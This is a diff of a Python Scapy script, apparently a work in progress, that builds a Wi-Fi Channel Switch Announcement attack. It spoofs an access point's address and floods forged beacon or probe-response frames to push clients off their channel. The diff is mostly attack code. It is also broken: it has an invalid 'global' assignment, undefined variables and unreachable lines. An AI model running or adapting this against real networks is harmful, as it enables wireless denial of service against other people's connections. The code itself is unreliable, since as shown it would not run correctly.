@@ -2,22 +2,47 @@ from scapy.all import *
 import time
 import sys
 import argparse
+import re
 
-def csa_attack(iface, ssid, ap_mac, victim):#, count):
-	print('[*] CSA Attack!')
-	dot11 = Dot11(type=0, subtype=8, addr1=victim, addr2=ap_mac, addr3=ap_mac)
-	beacon = Dot11Beacon(cap=0x401, timestamp=int(time.time()))
-	essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
-	dsparam = Dot11Elt(ID=0x3,len=1,info=b'\x28')
+parser = None
 
-	csa = Dot11Elt(ID=0x25,len=3,info=b'\x00\xff\x01')
+def csa_attack(parser):
+	if is_broadcast(parser):
+		packet = capture_beacon(parser)
+		print(packet)
+	
+	else:
+		dot11 = Dot11(type=0, subtype=0x5, addr1=parser.sta, addr2=parser.ap, addr3=parser.ap)
+		probe_resp = Dot11ProbeResp(cap=0x1111)
+		essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
+		csa = Dot11Elt(ID=0x25,len=3,info='\x00\x0b\x01')
 
-	#frame = RadioTap()/dot11/beacon/essid/dsparam/csa
-	frame = RadioTap()/dot11/beacon/essid/csa
-	print('[*] Start...!!')
-	sendp(frame, iface=iface, inter=0.0, loop=1)
-	# send -> No Working
-	#send(frame, iface=iface,count=int(count),inter=0.0,loop=1)
+		probeRespFrame = RadioTap()/dot11/probe_resp/essid/csa
+
+		print('[*] Start...!!')
+		sendp(probeRespFrame, iface=iface, inter=0.004, loop=1)
+		dsparam = Dot11Elt(ID=0x3,len=1,info=b'\x28')
+
+		csa = Dot11Elt(ID=0x25,len=3,info=b'\x00\xff\x01')
+
+		frame = RadioTap()/dot11/beacon/essid/csa
+
+
+def is_broadcast(parser):
+	if parser.casting == "broadcast":
+		return True
+	else:
+		return False
+
+def capture_beacon(parser):
+	return sniff(iface=parser.interface, prn = PacketHandler)
+
+def PacketHandler(packet):
+	if packet.haslayer(Dot11Beacon):
+		dot11 = packet.getlayer(Dot11)
+		if dot11.addr1 == parser.ap:
+			print(packet)
+			return packet
 
 class PARSER:
 	def __init__(self, opts):
@@ -25,31 +50,40 @@ class PARSER:
 		self.interface = self.interface(opts.interface)
 		self.channel = self.channel(opts.channel)
 		self.ap = self.mac(opts.ap)
-		self.sta = self.mac(opts.sta)
 
-		self.casting = opts.cast
+		self.casting = self.cast(opts.cast)
+
+		if self.casting == "unicast":
+			self.sta = self.mac(opts.sta)
+
+		
 		self.aggressive = opts.aggressive
 	
 	def help(self, _help):
 		if _help:
 			print("HELPPPPPP")
 
-	def mac(self, bssid):
-		print(bssid)
-		if bssid:
-			print("No BSSID Given")
+	def mac(self, mac_address):
+		if mac_address == None:
+			print("No MAC address Given")
 			exit(-1)
-		return bssid
+	
+		if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", mac_address):
+			return mac_address.lower()
+		else:
+			print("Invalid MAC Address Given")
+			exit(-1)
 
 	def channel(self, ch):
 		retval = list(range(1,164))
 		if ch:
 			if ch in retval:
-				return [ch]
+				return ch
 			else:
 				print("Invalid Channel Given.")
 		else:
-			return retval
+			print("No Channel Given")
+			exit(-1)
 	
 	def interface(self, iface):
 		def getNICnames():
@@ -84,6 +118,13 @@ class PARSER:
 			print("Interface Not Provided. Specify an Interface!")
 			exit(-1)
 
+	def cast(self, casting):
+		if casting == "unicast" or casting == "broadcast":
+			return casting
+		else:
+			print("Only unicast or broadcast")
+			exit(-1)
+
 
 if __name__ == '__main__':
 	parser = argparse.ArgumentParser(add_help=False)
@@ -94,11 +135,14 @@ if __name__ == '__main__':
 	parser.add_argument('-c', '--channel', dest='channel', default=0, type=int)
 	parser.add_argument('-a', '--accesspoint', dest='ap', default="", type=str)
 	parser.add_argument('-s', '--station', dest='sta', default="", type=str)
+	parser.add_argument('-v', '--ssid', dest='ssid', default="", type=str)
 
 	parser.add_argument('-d', '--casting', dest='cast', default="broadcast", type=str)
 	
 	parser.add_argument('--aggressive', dest='aggressive', default=False, type=bool)
 
 	options = parser.parse_args()
-	parser = PARSER(options)
-	print(f"interface: {parser.interface}\nChannel: {parser.channel}\nAP: {parser.ap}\nSTA: {parser.sta}\ncasting: {parser.casting}")
+	global parser = PARSER(options)
+	#print(f"interface: {parser.interface}\nChannel: {parser.channel}\nAP: {parser.ap}\nSTA: {parser.sta}\ncasting: {parser.casting}")
+
+	csa_attack(parser)
